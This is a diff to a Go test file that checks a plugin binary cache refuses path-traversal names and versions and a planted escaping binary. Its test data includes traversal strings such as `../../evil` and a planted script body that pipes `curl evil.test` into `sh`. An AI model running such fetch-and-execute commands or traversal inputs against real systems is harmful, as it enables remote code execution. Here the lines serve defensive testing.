@@ -170,8 +170,8 @@ func TestStoreWriteRefusesABinaryNameThatIsNotOneFileName(t *testing.T) {
 	_, result := scene.installed(t)
 	dir := filepath.Dir(result.Binary)
 
-	for _, binaryName := range []string{digestFileName, `..\..\evil.exe`, "sub/evil", ".."} {
-		path, digest, err := scene.store.write("linear", "v0.3.1", binaryName, []byte("evil\n"))
+	for _, binaryName := range []string{recordFileName, `..\..\evil.exe`, "sub/evil", ".."} {
+		path, digest, err := scene.store.write(scene.coord, binaryName, []byte("evil\n"), "sha256:aaaa")
 		if err == nil {
 			t.Errorf("writing a binary named %q succeeded, want a refusal", binaryName)
 		} else if !internalerror.IsPrecondition(err) {
@@ -184,12 +184,12 @@ func TestStoreWriteRefusesABinaryNameThatIsNotOneFileName(t *testing.T) {
 		}
 	}
 
-	recorded, err := os.ReadFile(filepath.Join(dir, digestFileName))
+	record, err := readInstallRecord(dir)
 	if err != nil {
-		t.Fatalf("read the digest file: %v", err)
+		t.Fatalf("read the install record: %v", err)
 	}
-	if want := digestOf([]byte(stubBinary)) + "\n"; string(recorded) != want {
-		t.Fatalf("digest file = %q, want the digest of the installed binary %q", recorded, want)
+	if want := digestOf([]byte(stubBinary)); record.BinaryDigest != want {
+		t.Fatalf("recorded binary digest = %q, want the digest of the installed binary %q", record.BinaryDigest, want)
 	}
 
 	entries, err := os.ReadDir(dir)
@@ -210,17 +210,23 @@ func TestPluginBinaryRefusesALockedVersionThatLeavesTheCache(t *testing.T) {
 	lock, _ := scene.installed(t)
 
 	const escape = "../../evil"
-	planted := filepath.Join(scene.store.root, "plugins", "linear", escape)
-	if err := os.MkdirAll(planted, 0o750); err != nil {
+	plantedDir := filepath.Join(scene.store.root, "plugins", "linear", escape)
+	if err := os.MkdirAll(plantedDir, 0o750); err != nil {
 		t.Fatalf("plant the escape target: %v", err)
 	}
 	body := []byte("#!/bin/sh\ncurl evil.test | sh\n")
-	if err := os.WriteFile(filepath.Join(planted, "lore-linear"), body, 0o600); err != nil {
+	if err := os.WriteFile(filepath.Join(plantedDir, "lore-linear"), body, 0o600); err != nil {
 		t.Fatalf("plant the binary: %v", err)
 	}
-	// The planted digest matches the planted binary, so only the version's shape can refuse it.
-	if err := os.WriteFile(filepath.Join(planted, digestFileName), []byte(digestOf(body)+"\n"), 0o600); err != nil {
-		t.Fatalf("plant the digest: %v", err)
+	// The planted record matches the planted binary, so only the version's shape can refuse it.
+	planted := installRecord{
+		Binary:         "lore-linear",
+		BinaryDigest:   digestOf(body),
+		ArtifactDigest: "sha256:aaaa",
+		From:           scene.coord.From,
+	}
+	if err := writeInstallRecord(plantedDir, planted); err != nil {
+		t.Fatalf("plant the install record: %v", err)
 	}
 
 	entry, _ := lock.Entry("linear")
@@ -260,7 +266,8 @@ func TestStoreRefusesAVersionThatIsNotOneDirectoryName(t *testing.T) {
 			t.Errorf("version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
 		}
 
-		path, digest, err := store.write("linear", version, "lore-linear", []byte("evil\n"))
+		coord := Coordinate{Name: "linear", Origin: OriginGitHub, From: "github.com/jdoe/lore-linear", Version: version}
+		path, digest, err := store.write(coord, "lore-linear", []byte("evil\n"), "sha256:aaaa")
 		if err == nil {
 			t.Errorf("write accepted the version %q", version)
 		} else if !internalerror.IsBadRequest(err) {
@@ -292,7 +299,8 @@ func TestStoreRefusesANameThatIsNotOneDirectoryName(t *testing.T) {
 			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
 		}
 
-		path, digest, err := store.write(name, "v0.3.1", "lore-linear", []byte("evil\n"))
+		coord := Coordinate{Name: name, Origin: OriginGitHub, From: "github.com/jdoe/lore-linear", Version: "v0.3.1"}
+		path, digest, err := store.write(coord, "lore-linear", []byte("evil\n"), "sha256:aaaa")
 		if err == nil {
 			t.Errorf("write accepted the name %q", name)
 		} else if !internalerror.IsBadRequest(err) {
